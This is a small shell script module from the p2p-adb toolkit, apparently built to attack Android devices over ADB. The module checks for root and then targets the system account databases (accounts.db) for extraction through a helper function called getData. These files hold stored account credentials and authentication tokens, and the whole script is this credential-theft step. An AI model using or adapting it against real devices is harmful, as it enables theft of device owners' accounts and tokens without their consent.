# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


echo $ISROOT

if [ $ISROOT -le 1 ]; then
	DATAPATH="/data/system/accounts.db /data/system/users/0/accounts.db"
	echo 'We are root...'
	getData "$DATAPATH"
else
	echo $ISROOT
fi

